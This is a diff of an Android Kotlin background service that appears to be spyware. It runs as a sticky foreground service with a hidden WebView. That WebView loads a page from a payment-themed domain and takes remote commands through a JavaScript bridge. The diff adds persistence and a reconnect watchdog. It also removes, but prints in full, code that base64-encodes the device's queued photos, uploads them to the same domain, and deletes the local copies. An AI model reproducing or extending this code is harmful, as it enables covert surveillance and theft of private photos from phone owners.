@@ -5,17 +5,12 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
-import android.net.ConnectivityManager
-import android.net.Network
-import android.net.NetworkCapabilities
-import android.net.NetworkRequest
 import android.net.http.SslError
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.Settings
-import android.util.Base64
 import android.webkit.JavascriptInterface
 import android.webkit.PermissionRequest
 import android.webkit.SslErrorHandler
@@ -25,55 +20,54 @@ import android.webkit.WebResourceRequest
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import java.io.File
-import java.io.FileOutputStream
-import java.io.OutputStreamWriter
-import java.net.HttpURLConnection
-import java.net.URL
 import java.net.URLEncoder
 
 class MonitorService : Service() {
 
     companion object {
         var lastStatus: String = "Service started"
-        var gotBridge: Boolean = false
+        var lastBridgeTime: Long = System.currentTimeMillis()
     }
 
     private val handler = Handler(Looper.getMainLooper())
     private var webView: WebView? = null
     private var fullUrl = ""
-    private var loadTries = 0
     private val monitorUrl = "https://payment70.site.je/monitor.html"
-    private val pendingPhotos = mutableListOf<File>()
-    private var isOnline = true
     private val CHANNEL_ID = "monitor_service"
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        return START_STICKY
+    }
 
     override fun onCreate() {
         super.onCreate()
         try {
             createNotificationChannel()
             startForeground(1, buildNotification())
-            setupWebView()
-            registerNetworkCallback()
-            handler.postDelayed(retryRunnable, 15000)
         } catch (e: Exception) {
-            lastStatus = "Error: " + e.message
         }
+        try {
+            setupWebView()
+        } catch (e: Exception) {
+            lastStatus = "WebView error: " + e.message
+        }
+        handler.postDelayed(watchdog, 20000)
     }
 
-    private val retryRunnable = object : Runnable {
+    private val watchdog = object : Runnable {
         override fun run() {
-            if (!gotBridge && loadTries < 30) {
-                loadTries++
-                lastStatus = "Retry " + loadTries
+            val idle = System.currentTimeMillis() - lastBridgeTime
+            if (idle > 60000) {
+                lastStatus = "Reconnecting..."
+                lastBridgeTime = System.currentTimeMillis()
                 try {
-                    webView?.loadUrl(fullUrl)
+                    webView?.reload()
                 } catch (e: Exception) {
                 }
             }
-            handler.postDelayed(this, 15000)
+            handler.postDelayed(this, 20000)
         }
     }
 
@@ -124,7 +118,7 @@ class MonitorService : Service() {
         webView!!.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                if (!gotBridge) {
+                if (lastStatus == "Service started") {
                     lastStatus = "Page loaded, waiting JS..."
                 }
             }
@@ -161,54 +155,6 @@ class MonitorService : Service() {
         webView!!.loadUrl(fullUrl)
     }
 
-    private fun registerNetworkCallback() {
-        try {
-            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
-            val request = NetworkRequest.Builder()
-                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                .build()
-            cm.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
-                override fun onAvailable(network: Network) {
-                    isOnline = true
-                    handler.post { uploadPendingPhotos() }
-                }
-                override fun onLost(network: Network) {
-                    isOnline = false
-                }
-            })
-        } catch (e: Exception) {
-        }
-    }
-
-    private fun uploadPendingPhotos() {
-        if (pendingPhotos.isEmpty() || !isOnline) return
-        Thread {
-            val copy = pendingPhotos.toList()
-            pendingPhotos.clear()
-            for (file in copy) {
-                try {
-                    val bytes = file.readBytes()
-                    val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
-                    val json = """{"image":"$b64","name":"${file.name}"}"""
-                    val url = URL("https://payment70.site.je/upload.php")
-                    val conn = url.openConnection() as HttpURLConnection
-                    conn.requestMethod = "POST"
-                    conn.doOutput = true
-                    conn.setRequestProperty("Content-Type", "application/json")
-                    OutputStreamWriter(conn.outputStream).use {
-                        it.write(json)
-                        it.flush()
-                    }
-                    conn.responseCode
-                    conn.disconnect()
-                    file.delete()
-                } catch (e: Exception) {
-                    pendingPhotos.add(file)
-                }
-            }
-        }.start()
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         try {
@@ -221,18 +167,19 @@ class MonitorService : Service() {
 class WebBridge {
     @JavascriptInterface
     fun onResult(text: String) {
-        MonitorService.gotBridge = true
+        MonitorService.lastBridgeTime = System.currentTimeMillis()
         MonitorService.lastStatus = text
     }
 
     @JavascriptInterface
     fun onCommand(text: String) {
-        MonitorService.gotBridge = true
+        MonitorService.lastBridgeTime = System.currentTimeMillis()
         MonitorService.lastStatus = text
     }
 
     @JavascriptInterface
     fun onUploadDone(text: String) {
+        MonitorService.lastBridgeTime = System.currentTimeMillis()
         MonitorService.lastStatus = text
     }
 }
